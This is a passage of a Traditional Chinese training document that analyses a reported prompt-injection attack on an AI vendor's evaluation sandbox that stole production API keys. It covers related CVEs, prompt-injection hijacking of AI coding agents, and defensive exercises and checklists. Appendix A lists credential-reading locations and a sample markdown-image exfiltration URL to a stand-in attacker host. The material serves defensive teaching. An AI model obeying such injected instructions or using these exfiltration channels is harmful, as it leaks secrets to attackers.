+<tr>
+<td>SiliconANGLE</td>
+<td>siliconangle.com/2026/09/10/...</td>
+<td>2026-09-10</td>
+<td><strong>僅引述 Anthropic</strong></td>
+<td>聚焦「單兵可跑國家級戰役」的趨勢框架。</td>
+</tr>
+<tr>
+<td>unwire.hk（藍骨，繁中）</td>
+<td>unwire.hk/2026/09/12/...</td>
+<td>2026-09-12</td>
+<td><strong>僅引述 Anthropic</strong></td>
+<td>中文報導，只泛提「俄語操作者用被盜 API 金鑰」，<strong>未</strong>具體覆蓋 GTG-50020 的沙箱/30 家/模型權重情節。</td>
+</tr>
+<tr>
+<td>aiposthub（Philo，繁中）</td>
+<td>aiposthub.com/anthropic-threat-intelligence-report-...-taiwan-...</td>
+<td>2026-09-11</td>
+<td><strong>僅引述 Anthropic</strong></td>
+<td>中文長文，重點在中國蒸餾與<strong>台灣電戰模擬（GTG-17002）</strong>，<strong>未</strong>覆蓋 GTG-50020。對台灣讀者有價值但與本案無關。</td>
+</tr>
+</tbody>
+</table>
+<h3 id="92">9.2 帶有獨立分析的評論（延伸、非查證原始事實）</h3>
+<table>
+<thead>
+<tr>
+<th>來源</th>
+<th>URL</th>
+<th>日期</th>
+<th>性質</th>
+<th>獨立貢獻</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>THE DAILY BRIEF（Rajesh Beri）</td>
+<td>beri.net/article/anthropic-threat-report-eval-sandbox-litellm-prompt-injection-api-key-theft</td>
+<td>2026-09-12</td>
+<td><strong>獨立技術分析（延伸）</strong></td>
+<td>提出「eval 沙箱＝<strong>a credential store with a chat interface（帶聊天介面的憑證保險庫）</strong>」的洞見；主張把 CI/CD 安全實務映射到 eval harness、把「不可信執行」與「持憑證元件」拆開。<strong>不驗證原始數字，但獨立強化了攻擊面分析。</strong></td>
+</tr>
+<tr>
+<td>D3 Security（SOC takeaways）</td>
+<td>d3security.com/blog/anthropic-threat-report-september-2026-soc-takeaways/</td>
+<td>2026-09-11</td>
+<td><strong>獨立偵測建議（延伸）</strong></td>
+<td>提出可操作建議：對 AI 呼叫做<strong>出站監控（egress monitoring）</strong>、把「模型端點的異常用量」當成失陷訊號、盤點散在應用/容器/行動 build/公開 repo 的 AI 憑證。</td>
+</tr>
+<tr>
+<td>Fingerprint（fraud 團隊視角）</td>
+<td>fingerprint.com/blog/anthropic-threat-intelligence-report-takeaways/</td>
+<td>2026-09-11</td>
+<td><strong>僅引述 Anthropic＋產品脈絡</strong></td>
+<td>用本案的 antidetect/KYC 情節帶自家裝置情報方案；<strong>未提供自有遙測數據</strong>。</td>
+</tr>
+</tbody>
+</table>
+<h3 id="93">9.3 對「本案所用技術類型」的獨立研究（不是查證本案，但可佐證技術真實存在）</h3>
+<p>這些是與本案 TTP <strong>同型</strong>的公開研究/漏洞，可用來向學員證明「這些手法在真實世界確有其事」，但<strong>它們不指涉 GTG-50020 這個具體行為者</strong>：</p>
+<ul>
+<li><strong>LiteLLM 一連串漏洞</strong>（獨立查證，技術真實）：</li>
+<li><strong>CVE-2026-42208</strong>（LiteLLM Proxy API 金鑰驗證的 SQL injection，CVSS 9.3；影響 v1.81.16–v1.83.6，修於 v1.83.7+，建議升 v1.83.10-stable；公告 2026-04-29，docs.litellm.ai）。</li>
+<li><strong>CVE-2026-42271</strong>（MCP 測試端點命令注入，CVSS 8.7）＋ <strong>CVE-2026-48710「BadHost」</strong>（Starlette Host 標頭認證繞過）串成<strong>未認證 RCE</strong>（CSA Lab Space，2026-06-17）。</li>
+<li>權限提升鏈 <strong>CVE-2026-47101/47102/40217</strong>、SSTI <strong>CVE-2026-42203</strong>；以及 <strong>TeamPCP</strong> 於 2026-03 對 PyPI 投毒 v1.82.7/1.82.8，竊雲端金鑰/K8s token（CSA、Sysdig、runzero）。</li>
+<li><strong>與本案的關係</strong>：報告 p.29 明說「<strong>multiple actors</strong>（多名行為者，非專指 GTG-50020）compromised AI wrapper services' implementation of LiteLLM—they used <strong>prompt injection to exfiltrate the production API keys</strong> used in their cloud-hosted container environments」；GTG-50020 儀表板 W5 亦有「exposed LLM gateways」。<strong>精確措辭上，LiteLLM 的 prompt-injection 竊金鑰在報告裡歸給「多名行為者」的通則，而 GTG-50020 被明確點名的是「評測沙箱」注入——課堂上不要把兩者混為一談、過度歸因。</strong></li>
+<li><strong>Comment and Control（獨立研究，技術真實）</strong>：Aonan Guan、Zhengyu Liu、Gavin Zhong（JHU）揭露 Claude Code Action／Gemini CLI Action／GitHub Copilot Agent 可被 PR 標題/issue/註解裡的 prompt injection 劫持，透過 GitHub 自身通道外洩 <code>ANTHROPIC_API_KEY</code>、<code>GITHUB_TOKEN</code> 等（揭露 2025-10 起至 2026-03；oddguan.com、CSA）。另有 RyotaK/GMO Flatt Security 於 2026-01 揭 claude-code-action 缺陷、Cline v2.3.0 於 2026-02 的供應鏈事件。<strong>佐證「AI 代理＋CI/CD 憑證」正是新型攻擊面。</strong></li>
+<li><strong>OpenClaw 安全（獨立研究）</strong>：間接 prompt injection、公網暴露的控制台（一次掃描發現 42,665 個實例、其中 93.4% 認證被繞過）、MoltBot 洩漏 150 萬把明文 API 金鑰（含 OpenAI/Anthropic/AWS/Stripe）（CrowdStrike、Giskard 等，2026 上半）。報告 p.12 亦把「prompt injection of LiteLLM or <strong>OpenClaw</strong> deployments」列為機會型攻擊之一。</li>
+<li><strong>PentAGI（獨立可查的開源框架）</strong>：<code>vxcontrol/pentagi</code>，MIT 授權，<strong>orchestrator＋researcher/developer/executor 多代理</strong>、Docker/Kali 沙箱、支援 OpenAI/Anthropic/Gemini/Bedrock/<strong>Ollama</strong>/DeepSeek/OpenRouter <strong>與可自建/本地閘道</strong>（Help Net Security，2026-04-22）。<strong>這正是 Fig. 16「containerized open-source pentest platform fronted by a local model gateway」的現實對應物</strong>；報告 p.5、p.38 明確點名 GTG-50020 與 GTG-50029 用了 PentAGI 這類公開攻擊型代理框架。</li>
+<li><strong>模型權重竊取的威脅建模（獨立研究）</strong>：RAND《Securing AI Model Weights》（RRA2849-1，2024-05）識別 <strong>38 個攻擊向量、9 大類、5 個安全等級（SL1–SL5）與 5 種攻擊者能力層級（OC1–OC5）</strong>；後續《Achieving SL3》（RRA4704-1，2026-08）給出 <strong>262 條控制（改編自 NIST SP 800-53 Rev 5）</strong>，專防<strong>組織型網路犯罪與內部威脅</strong>、對應 31 個攻擊向量、6–12 個月可落地。Anthropic 自家 <strong>RSP/ASL-3</strong> 標準要求「<strong>硬化安全，使非國家攻擊者難以竊取模型權重、進階威脅（如國家）非付出重大代價無法竊取</strong>」，並隨 Claude Opus 4 啟用。<strong>這些是理解本案「未發布模型＝皇冠寶石」的威脅建模基礎。</strong></li>
+<li><strong>住宅代理與 antidetect 生態（獨立研究）</strong>：學術經典《Resident Evil: Understanding Residential IP Proxy as a Dark Service》（Mi et al., IEEE S&amp;P 2019）以滲透框架偵測到 <strong>600 萬個住宅代理 IP、跨 230+ 國、52K+ ISP</strong>，且大量節點疑為受害的 IoT/家用主機；業界研究（SpyCloud、Group-IB、Fingerprint、Castle）詳述 antidetect 瀏覽器如何偽造 canvas/WebGL/字型/UA/時區/AudioContext，並與住宅代理搭配量產合成身分——<strong>偵測關鍵是「指紋的內部一致性」而非單一訊號</strong>。AiTM 反向代理釣魚（Tycoon 2FA、Kali365）與 KYC 繞過生態（22 個 Telegram 頻道兜售對 Binance/BBVA/Revolut 的 KYC 繞過工具）則佐證 Fig. 18 的手法在地下市場已成商品。</li>
+</ul>
+<h3 id="94">9.4 台灣在地佐證（與本案技術同型的真實事件）</h3>
+<ul>
+<li><strong>Booking.com 台灣釣魚事件</strong>（數位時代，李先泰，2026-04-16）：一波針對旅宿業的系統性攻擊——第一階段用<strong>自動產生的 Gmail</strong> 對飯店訂房信箱寄假投訴信、連結用 <strong>IDN 同形攻擊</strong>（把拉丁 <code>o</code> 換成西里爾 <code>о</code>）；第二階段先對瀏覽器<strong>指紋辨識過濾資安研究員</strong>，再把員工導到<strong>偽造的合作夥伴登入頁</strong>竊取飯店 Booking 帳密；第三階段登入後台<strong>匯出旅客資料</strong>，透過 <strong>WhatsApp</strong> 發送含準確訂房日期/編號的釣魚訊息、施壓「24 小時內未付款將取消」。外洩含姓名/email/電話/訂單細節，未及信用卡與實體地址。<strong>這起真實在台事件，與 GTG-50020「歷史打旅館訂房平台」及 Fig. 18「lookalike 網域＋指紋過濾研究員」的手法高度同型，是最好的台灣切入點。</strong>（性質：獨立在地事件，非本案，但技術同型。）</li>
+<li><strong>台灣 VASP 監理</strong>：《虛擬資產服務法》2026-06-30 三讀，從洗錢防制「登記制」轉向「許可制」；5 家銀行試辦虛擬資產保管；要求 VASP 於 2026 年底前建置區塊鏈分析系統並納入年度檢查。<strong>直接關聯 Fig. 17/18 打「加密貨幣交易所與 KYC 廠商」的情節。</strong></li>
+</ul>
+<hr />
+<h2 id="10">10. 課程教學設計</h2>
+<h3 id="101">10.1 核心教學要點</h3>
+<ol>
+<li><strong>AI 供應鏈已是蓄意犯罪目標</strong>：報告原句「the clearest demonstration to date that the AI supply chain has become a deliberate criminal target」（p.31）。學員要理解「AI 廠商、評測方、可信存取計畫」本身就是新的高價值標的。</li>
+<li><strong>憑證＝戰利品＋算力＋掩護</strong>（Loot／Compute／Cover，p.30）：AI 時代的憑證外洩比傳統更嚴重，因為它同時讓攻擊者「賺一筆、用你的錢跑攻擊、掛你的名」。</li>
+<li><strong>評測沙箱/AI 閘道是被忽視的攻擊面</strong>：它們<strong>同時</strong>執行不可信輸入、又持有生產憑證——這是本案初始存取的結構性破口，也是所有自建 AI 整合的通病。</li>
+<li><strong>自主程度是一把獨立的尺</strong>：用 Fig. 15 vs Fig. 16 教「人類逐步指揮」與「全自主」的差別，並延伸到「自主 ≠ 危害」（兩條獨立軸，p.39）。</li>
+<li><strong>偵測要抓『AI 編排的形狀』</strong>：機器速度、平行度、無晝夜節律、機械式重試——這些比易腐的 IP/雜湊更耐久。</li>
+<li><strong>模型權重＝新型皇冠寶石</strong>：與傳統智財竊取的差異（見 10.2 討論題），以及「意圖 vs 戰果」的情報紀律（想偷≠偷到）。</li>
+<li><strong>共同責任</strong>：供應商守住核心，不代表客戶端不會外洩金鑰。防護重心要放在整合層。</li>
+<li><strong>單一來源情報的謙遜</strong>：本案的關鍵數字目前只有 Anthropic 一個來源——教學員如何標記與對待單源情報。</li>
+</ol>
+<h3 id="102">10.2 課堂討論題（有爭議、無標準答案）</h3>
+<ol>
+<li><strong>模型權重 vs 傳統智財</strong>：偷一份未發布模型權重，和偷一份原始碼或設計圖，威脅模型有何不同？（提示：權重是「能力本身」可即插即用、可規避對齊防護、無法像程式碼那樣打補丁、竊取後難以證明、且一旦外流無法收回。）RAND 的 SL/OC 分級與 Anthropic ASL-3 的「非國家攻擊者不可得、國家需重大代價」門檻，對一個「4 天打 30 家的財務動機犯罪者」是否足夠？</li>
+<li><strong>「捏造授權說辭」的防護困境</strong>：Fig. 15 第 1 步用假的「這是獲授權滲透測試」騙過 AI。模型該如何區分真假授權？若要求驗證授權，會不會反而擋住合法紅隊？這題沒有乾淨解。</li>
+<li><strong>自主 ≠ 危害</strong>：報告說「several of the most serious compromises... came from operations where a human directed every step」。那麼防守資源該優先投在「抓全自主管線」還是「抓人類精準指揮」？</li>
+<li><strong>單一來源情報</strong>：當關鍵事實只有模型供應商一家有遙測、且受害者未具名，資安社群該如何看待？供應商既是「守門人」又是「唯一目擊者」，有無利益衝突？如何設計可獨立驗證的機制？</li>
+<li><strong>框架缺口</strong>：ATT&amp;CK/ATLAS 都還沒有「多代理自主編排」的戰術。若要你補一個，它的技術與子技術會長怎樣？可觀測資料來源（data sources）是什麼？</li>
+<li><strong>合法工具的兩用性</strong>：PentAGI 是 MIT 授權的開源自主滲透框架，對藍隊/紅隊都有正當用途。社群該如何在「開放安全研究」與「降低犯罪門檻」之間取捨？下架有用嗎？</li>
+</ol>
+<h3 id="103">10.3 實作／桌面演練建議（安全、不教攻擊操作）</h3>
+<ol>
+<li><strong>Fig. 15 vs 16 日誌辨識演練（純防守）</strong>：發給學員兩份<strong>合成</strong>的（模擬）web 伺服器/API 存取日誌，一份呈現「批次＋人類作息空窗」節律、一份呈現「均勻 24/7＋機械式等間隔重試」。要學員<strong>只憑節律與模式</strong>判斷哪份較可能是「人類指揮」vs「全自主管線」，並寫出各自的偵測規則（不涉及任何攻擊操作）。</li>
+<li><strong>eval harness / AI gateway 設定稽核（藍隊）</strong>：給一份<strong>去識別化</strong>的 LiteLLM/自建 AI 閘道設定，讓學員對照第 10.4 的稽核清單找出「憑證放環境變數」「MCP 測試端點對外」「主金鑰可被程序讀取」「沙箱有網路且非唯讀」等錯誤設定，並提出修法。<strong>只做設定審查，不做漏洞利用。</strong></li>
+<li><strong>威脅建模工作坊</strong>：以 RAND《Securing AI Model Weights》的 9 大類攻擊向量為藍本，讓學員替一個「假想的內部模型評測平台」畫資料流圖、標出「哪裡持有生產憑證」「哪裡執行不可信輸入」，找出兩者重疊的信任邊界並提出隔離方案。</li>
+<li><strong>IOC 生命週期演練</strong>：用第 7 節的 8 個 IP（<strong>僅紙上分析、嚴禁連線</strong>），讓學員判斷哪些適合回溯獵捕、哪些該丟棄，並解釋為何行為型指標比 IP 更值得寫進偵測。</li>
+<li><strong>KYC/antidetect 對抗桌面推演（金融場景）</strong>：以 Fig. 17/18 為腳本，讓學員扮演台灣某交易所的風控團隊，設計「不依賴單一訊號、看指紋內部一致性與 session 多來源」的偵測策略。<strong>只設計偵測，不建置任何繞過工具。</strong></li>
+</ol>
+<h3 id="104">10.4 對台灣的意涵（必寫）</h3>
+<p><strong>A. 台灣金融機構的 KYC 流程 vs antidetect browser／住宅代理的對抗</strong></p>
+<ul>
+<li><strong>威脅落地</strong>：Fig. 17（合成身分量產）與 Fig. 18（劫持真實 KYC session）直接打「加密貨幣交易所與 KYC 廠商」。台灣《虛擬資產服務法》2026 年上路後轉為許可制、要求 eKYC 與區塊鏈分析系統——<strong>合規要求提高，攻擊者的動機與工具也同步升級</strong>。地下市場已有針對 Binance/Revolut 等的 KYC 繞過服務商品化（22 個 Telegram 頻道），台灣本土交易所沒有理由自認免疫。</li>
+<li><strong>具體建議</strong>：<br />
+  1. <strong>不要只驗「當下這一關」</strong>：Fig. 18 的殺傷力在於<strong>受害者真的通過了 KYC</strong>，破口在 session 層。風控要做<strong>跨階段的 session 一致性檢查</strong>（同一已驗證 session 是否從註冊地以外的裝置/IP 被使用、liveness 完成後裝置指紋是否突變）。<br />
+  2. <strong>看指紋的內部一致性</strong>：antidetect 瀏覽器的破綻是「偽造得不自洽」（宣稱的時區/語言/字型/GPU 與 IP 地理或行為不符）。導入<strong>行為＋網路＋裝置的綜合情報</strong>，而非單看 IP 黑名單。<br />
+  3. <strong>住宅代理的假設要翻轉</strong>：住宅 IP 不再等於「真人、低風險」。對來自已知住宅代理池、且與帳戶歷史行為不符的登入，要提高審查。<br />
+  4. <strong>對抗研究者過濾</strong>：Booking.com 在台事件顯示攻擊者會<strong>先指紋辨識過濾掉資安研究員</strong>再放行受害者。藍隊的沙箱/爬蟲若被輕易識別，就看不到真正的惡意頁面——需準備更擬真的偵測環境。</li>
+</ul>
+<p><strong>B. 企業自建 AI gateway（LiteLLM 等）的設定稽核清單</strong></p>
+<p>台灣不少企業為了成本與資料落地自建 LLM 閘道/代理框架，本案與 LiteLLM 系列 CVE 合起來就是一份現成的稽核清單：</p>
+<ol>
+<li><strong>閘道不要裸奔上公網</strong>：放在反向代理/零信任後，限制來源 IP；別讓管理 UI 或 <code>/mcp-rest/test/*</code> 這類測試端點對外。</li>
+<li><strong>憑證離開環境變數</strong>：把供應商生產金鑰、主金鑰、DB 連線字串移進秘密管理系統（Vault／雲端 Secrets Manager），不要塞在 env 或設定檔裡讓被攻陷的程序一把撈走。</li>
+<li><strong>最小權限跑</strong>：以非 root、唯讀檔案系統、必要時無網路的容器執行；虛擬金鑰限定 <code>allowed_routes</code>，別給 <code>/*</code>。</li>
+<li><strong>每個下游應用一把短命、範圍受限、可設用量上限的金鑰</strong>：一把被偷不會全盤皆輸，且異常用量會被上限擋下。</li>
+<li><strong>eval / 沙箱與憑證分離</strong>：凡是「會執行不可信輸入」（跑待測模型輸出、跑外部投稿的任務檔、跑工具呼叫）的元件，<strong>不得</strong>與「持有生產憑證」的元件共用信任邊界。</li>
+<li><strong>打補丁與盤點</strong>：跟上 LiteLLM 等的安全公告（本案期間有多個 CVSS 9+ 的未認證 RCE/SQLi）；用資產發現工具定期掃「我方有沒有 LLM 閘道暴露在外」。</li>
+<li><strong>出站監控（最關鍵的偵測）</strong>：對 AI 呼叫做 egress monitoring——<strong>模型端點的異常用量、API 金鑰出口 IP 突變，現在就是失陷訊號</strong>（D3 Security 建議）。</li>
+<li><strong>代理框架（PentAGI/OpenClaw 類）治理</strong>：若內部紅隊要用自主滲透框架，必須在<strong>隔離、獲授權、且不對生產系統啟用自動利用</strong>的前提下；企業也要能偵測「員工或攻擊者在內網跑起這類框架」。</li>
+</ol>
+<p><strong>C. 旅遊與訂房業的資料保護</strong></p>
+<ul>
+<li><strong>台灣是重災區</strong>：刑事局 165 統計顯示訂房網站（含 Booking.com）詐騙通報件數居高；GTG-50020「歷史專打旅館訂房平台」＋儀表板 W10「Hotel-tech intrusion（revenue/feedback vendors）」說明<strong>旅宿業的後台帳號與旅客個資是被鎖定的變現標的</strong>。</li>
+<li><strong>具體建議</strong>：<br />
+  1. <strong>旅宿業者端</strong>：後台帳號強制 MFA（且優先用抗釣魚的 FIDO2 而非簡訊碼，因為 Fig. 18 型 AiTM 能中繼簡訊/TOTP）；對「合作夥伴登入頁」類釣魚做員工訓練；監控後台旅客資料的<strong>大量匯出</strong>行為。<br />
+  2. <strong>旅客端衛教</strong>：Booking 完成訂房後<strong>絕不會要求點連結補差價</strong>；不要點 email 或站內訊息裡的付款連結，改到官網自行查聯絡管道；對含準確訂房日期/編號但要你「24 小時內付款」的訊息保持警覺（那代表後台已外洩）。<br />
+  3. <strong>平台端</strong>：對 IDN 同形網域（西里爾字母混拉丁）做主動偵測與下架；對旅客 PII 的後台匯出加流量異常告警。</li>
+</ul>
+<hr />
+<h2 id="11">11. 關鍵原文引文（英文原文＋繁中翻譯，附頁碼）</h2>
+<ol>
+<li>
+<p><strong>（行為者側寫，p.30）</strong></p>
+<blockquote>
+<p>"GTG-50020 is a Russian-speaking, financially-motivated actor who had historically conducted intrusions against hotel booking and financial technology platforms."<br />
+   譯：GTG-50020 是一名俄語、財務動機的行為者，歷史上專門入侵旅館訂房平台與金融科技平台。</p>
+</blockquote>
+</li>
+<li>
+<p><strong>（犯罪規模數字，p.30）</strong></p>
+<blockquote>
+<p>"In one intrusion, they exfiltrated roughly 26 gigabytes of data from one victim and sought payment in extortion attempts (or from selling the data on darkweb forums) of between $1.5 and 2.5 million."<br />
+   譯：在一起入侵中，他們從單一受害者外洩約 26 GB 資料，並在勒贖（或在暗網論壇轉售資料）中索求 150 萬至 250 萬美元。</p>
+</blockquote>
+</li>
+<li>
+<p><strong>（評測沙箱注入＝本案關鍵，p.30）</strong></p>
+<blockquote>
+<p>"By injecting malicious instructions into an AI vendor's automated evaluation sandbox, the actor caused the sandbox to hand over the credentials it held—including the production AI API keys from multiple providers belonging to that vendor."<br />
+   譯：透過對某 AI 廠商的自動化評測沙箱注入惡意指令，該行為者誘使沙箱交出它所持有的憑證——包括該廠商所擁有、來自多家供應商的生產 AI API 金鑰。</p>
+</blockquote>
+</li>
+<li>
+<p><strong>（金鑰即掩護：自動換槍，p.31）</strong></p>
+<blockquote>
+<p>"In effect, when they obtained the target's API keys, they automatically switched to using the victim's keys instead of their own."<br />
+   譯：實際效果是，一旦取得目標的 API 金鑰，他們就自動切換成使用受害者的金鑰、而非自己的。</p>
+</blockquote>
+</li>
+<li>
+<p><strong>（四天三十家＋樣板化，p.31）</strong></p>
+<blockquote>
+<p>"A follow-on campaign run from the same infrastructure attacked roughly thirty AI companies in about four days with similar techniques. They identified one successful attack path and repeated it against all thirty targets, adapting slightly to account for differences across the targets."<br />
+   譯：一場由同一套基礎設施發動的後續戰役，在約四天內以類似手法攻擊約三十家 AI 公司。他們找出一條成功的攻擊路徑，重複施加於全部三十個目標，並依各目標差異略作調整。</p>
+</blockquote>
+</li>
+<li>
+<p><strong>（目標＝未發布模型、從未得手、核心未失守，p.31）</strong></p>
+<blockquote>
+<p>"The actor's stated goal, pursued across more than a dozen avenues, was access to a pre-release Claude model. The actor never gained access; every attempted path failed. In all of this, the keys involved were customers' keys stolen from customers' environments. The actor never compromised Anthropic's own systems."<br />
+   譯：該行為者橫跨超過一打途徑所追求的既定目標，是取得未發布的 Claude 模型。該行為者從未得手；每一條嘗試的路徑都失敗。在這一切當中，涉及的金鑰全是從客戶環境竊得的客戶金鑰。該行為者從未入侵 Anthropic 自己的系統。</p>
+</blockquote>
+</li>
+<li>
+<p><strong>（本案定性，p.31）</strong></p>
+<blockquote>
+<p>"This case is the clearest demonstration to date that the AI supply chain has become a deliberate criminal target."<br />
+   譯：本案是迄今最清楚的例證，證明 AI 供應鏈已成為蓄意的犯罪目標。</p>
+</blockquote>
+</li>
+<li>
+<p><strong>（全自主利用打生產系統，p.32）</strong></p>
+<blockquote>
+<p>"This loop was run with exploitation enabled against production systems, meaning it both attempted to identify vulnerabilities and actively exploit them for access in the same workflows."<br />
+   譯：這條迴圈是在「對生產系統啟用實際利用」的狀態下運行，意即它在同一套工作流裡既嘗試找出漏洞、也主動利用漏洞取得存取。</p>
+</blockquote>
+</li>
+</ol>
+<hr />
+<h2 id="12">12. 未能驗證之處與研究限制</h2>
+<ol>
+<li><strong>單一來源情報</strong>：本案所有關鍵事實（26 GB、$1.5–2.5M、評測沙箱注入、30 家、未發布模型未得手、Anthropic 核心未失守）<strong>目前僅有 Anthropic 這份報告一個來源</strong>。所有媒體報導（含繁中）均為轉述，<strong>無任何第三方獨立確認</strong>。依簡報紅線，一律<strong>以 PDF 原文為準</strong>；引用時務必標明為單源。</li>
+<li><strong>受害者未具名</strong>：報告只給受害者「類型與數量級」，未點名任何 AI 廠商、交易所或旅宿業者。「effects on targets」在儀表板上被標為「<strong>inferred（推斷）</strong>」，代表連 Anthropic 自己對「誰實際受害」也有一部分是推斷而非確認。</li>
+<li><strong>「30 家」「&gt;12 條途徑」「18/26」等為約數</strong>：報告用「roughly」「about」「more than a dozen」等模糊量詞；儀表板的「18/26」「60 across 10 workflows」是 Anthropic 內部計數口徑，未公開定義。</li>
+<li><strong>LiteLLM/OpenClaw 與本案的關係要小心界定</strong>：報告把「用 prompt injection 對 LiteLLM 竊生產金鑰」歸給「<strong>multiple actors</strong>（多名行為者）」（p.29）與機會型攻擊通則（p.12），而 GTG-50020 被<strong>明確</strong>點名的是「評測沙箱」注入。本教材把 LiteLLM 系列 CVE 當作「同型技術的獨立佐證」，<strong>不宣稱</strong> GTG-50020 就是那些 LiteLLM 攻擊的作者。</li>
+<li><strong>時間範圍不一致</strong>：IOC 表只涵蓋 2026-05-21～06-16，但儀表板寫戰役 73 天（05→07）、任務卡為 07 月。本教材已在第 7.3 節標註此落差，推測 IOC 表僅為戰役片段，但<strong>報告未解釋此差異</strong>。</li>
+<li><strong>PentAGI 的關聯是「這一類框架」層級</strong>：報告說 GTG-50020 用了「PentAGI 這類（like PentAGI）」公開框架，Fig. 16 描述「containerized open-source pentest platform fronted by a local model gateway」與 PentAGI 特徵吻合，但<strong>報告未明確斷言本案就是用 PentAGI 本尊</strong>，故僅能說「高度相符」。</li>
+<li><strong>本案缺網域/雜湊/帳號類 IOC</strong>：相較報告其他案例，GTG-50020 只給了 8 個出口 IP，未給網域、檔案雜湊或通聯帳號，限制了獨立獵捕與交叉比對的空間。</li>
+<li><strong>圖表文字為人工判讀</strong>：第 6 節所有圖上文字均以放大 PNG 逐格人工轉錄，已盡力校對；極少數以小字呈現的括號說明若與讀者自行判讀有出入，仍以原始 PNG 為準。</li>
+</ol>
+<hr />
+<h1 id="a-prompt-injection">附錄 A：評測沙箱 prompt injection 竊生產金鑰的完整技術路徑（技術深化）</h1>
+<blockquote>
+<p>第二階段技術深化增補（2026-09-14）。本附錄不改動前文任何內容，只把「技術高手能據以理解與防禦」的層次補齊：攻擊鏈的實際命令與 API 呼叫、CVE 的利用原理與受影響版本、可直接部署（需依自家 schema 微調）的偵測規則，以及用 Mermaid 重畫的關鍵流程。所有偵測規則僅供<strong>防守</strong>用途；IOC 一律保留 defang、嚴禁連線。</p>
+</blockquote>
+<h2 id="a1-lethal-trifecta">A.1 為什麼評測沙箱天生就是一組「致命三元組（lethal trifecta）」</h2>
+<p>獨立研究者 Simon Willison 於 2025 年提出的 <strong>lethal trifecta</strong> 是理解本案初始存取（第 4.2 節主線 A）最精準的技術框架。它主張：任何 AI agent 只要<strong>同時</strong>具備以下三個條件，就可被間接提示注入（indirect prompt injection）竊取資料——缺一則攻擊鏈斷裂：</p>
+<ol>
+<li><strong>存取私密資料（access to private data）</strong></li>
+<li><strong>接觸不可信內容（exposure to untrusted content）</strong></li>
+<li><strong>能對外通訊（ability to communicate externally）</strong></li>
+</ol>
+<p>把 AI 廠商的<strong>自動化評測沙箱</strong>逐項對進去，會發現它是三元素的完美交會點：</p>
+<table>
+<thead>
+<tr>
+<th>三元組要素</th>
+<th>評測沙箱為何天生具備</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>私密資料</td>
+<td>為了對比評測「多家供應商（multiple providers）」的模型，沙箱的環境變數／設定檔裡放著<strong>一整排生產 API 金鑰</strong>（<code>OPENAI_API_KEY</code>、<code>ANTHROPIC_API_KEY</code>、<code>GOOGLE_API_KEY</code>…）。這正是報告 p.30 說的「the production AI API keys from multiple providers」。</td>
+</tr>
+<tr>
+<td>不可信內容</td>
+<td>評測工作本身就是<strong>跑不可信輸入</strong>：待測模型的輸出、可由外部投稿的任務檔（eval task）、以及待測模型產生的工具呼叫（tool call）。這些內容天生不可信。</td>
+</tr>
+<tr>
+<td>對外通訊</td>
+<td>沙箱<strong>本來就要出網</strong>去呼叫各家供應商 API——所以「對外通訊」不是可關掉的例外，而是它的核心功能。</td>
+</tr>
+</tbody>
+</table>
+<p><strong>同型的公開先例</strong>：微軟 M365 Copilot 的 <strong>EchoLeak（CVE-2025-32711，CVSS 9.3）</strong> 是一個 zero-click 案例——一封精心構造的 email 即可在無使用者互動下外洩內部檔案與 API 金鑰。其結構與本案一致：agent 讀到攻擊者可控的不可信內容、agent 有權存取私密資料、agent 有對外通道。<strong>GTG-50020 對評測沙箱做的，就是把 EchoLeak 那套邏輯搬到「持有整排生產金鑰」的評測基礎設施上。</strong></p>
+<h2 id="a2">A.2 憑證如何進沙箱、又如何被「吐」出來（逐環技術鏈）</h2>
+<p><strong>憑證如何進到沙箱（攻擊面成形）</strong>：最常見的反模式是把生產金鑰以<strong>環境變數</strong>注入容器。一旦如此，沙箱內<strong>任何</strong>子程序或被注入操控的 agent 都能用最普通的方式讀到它們：</p>
+<ul>
+<li><code>os.environ</code> / <code>process.env</code>（程式語言層）</li>
+<li><code>/proc/self/environ</code>、<code>/proc/&lt;pid&gt;/environ</code>（Linux 程序記憶體層）</li>
+<li><code>printenv</code>、<code>env</code>、<code>set</code>（shell 層）</li>
+<li>讀 <code>~/.aws/credentials</code>、<code>.env</code>、<code>config.yaml</code>、K8s mounted secret 檔</li>
+</ul>
+<p><strong>間接注入如何導向外洩（防禦性描述，非攻擊教學）</strong>：注入內容的邏輯目的，是誘導 agent 執行「<strong>讀取上述憑證來源 → 把值寫進一個會離開信任邊界的地方</strong>」。實務上外洩通道有三類，全都是「看起來像正常評測輸出」的合法動作被濫用：</p>
+<ol>
+<li><strong>直接回顯（reflect）</strong>：讓金鑰出現在模型輸出／eval log／報告欄位裡，之後由攻擊者可見的表面收走。</li>
+<li><strong>工具呼叫夾帶（tool-call exfil）</strong>：沙箱若允許 HTTP request、<code>git push</code>、檔案上傳、webhook，注入就讓 agent 把金鑰當成請求參數送到外部端點。</li>
+<li><strong>編碼隱藏（encoded exfil）</strong>：把金鑰 base64 後藏進 Markdown 圖片 URL 的 query string（<code>![](https://attacker/x?d=&lt;base64&gt;)</code>）、或藏進看似正常的程式碼片段——這是典型的「隱蔽外洩」手法，能繞過只看明文金鑰樣態的偵測。</li>
+</ol>
+<pre class="mermaid">sequenceDiagram
+    autonumber
+    actor ATK as 攻擊者
+    participant EVAL as 不可信評測內容
+    participant SBX as 評測沙箱 Agent
+    participant EXF as 外洩通道
+    participant PROV as 供應商 API
+    ATK-&gt;&gt;EVAL: 投入含間接提示注入的任務或待測輸出
+    EVAL-&gt;&gt;SBX: 沙箱載入並執行不可信內容
+    Note over SBX: 沙箱同時持有生產金鑰(env)、&lt;br/&gt;執行不可信內容、可對外通訊 = lethal trifecta
+    SBX-&gt;&gt;SBX: 依注入讀取 os.environ 與設定檔中的金鑰
+    SBX-&gt;&gt;EXF: 以回顯/工具呼叫/編碼夾帶外洩金鑰
+    EXF-&gt;&gt;ATK: 攻擊者取得多家供應商生產金鑰
+    ATK-&gt;&gt;PROV: 直接用受害者金鑰呼叫(自動換槍)
+    Note over ATK,PROV: 同時達成 Loot + Compute + Cover(第 4.3 節)
+</pre>
+<h2 id="a3-egress">A.3 防守方的隔離技術：金鑰不進沙箱、短期憑證、egress 控制</h2>
+<p>修法的核心是<strong>打破 lethal trifecta 的任一條邊</strong>。最有效的是同時做「憑證離開沙箱」＋「短期化」＋「出站收斂」三件事：</p>
+<p><strong>（1）信任邊界拆分——broker 模式，金鑰根本不進沙箱</strong><br />
